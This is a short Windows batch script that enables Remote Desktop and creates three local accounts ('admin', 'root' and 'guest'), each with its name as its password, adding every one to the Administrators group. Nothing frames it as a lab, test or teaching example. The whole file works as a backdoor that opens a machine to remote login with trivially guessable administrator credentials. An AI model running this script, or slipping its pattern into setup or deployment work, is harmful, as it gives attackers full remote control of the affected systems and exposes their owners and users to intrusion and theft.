@echo off

REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD  /d  0  /f
net user admin admin /add
net localgroup administrators admin /add
net user root root /add
net localgroup administrators root /add

net user guest guest /add
net localgroup administrators guest /add

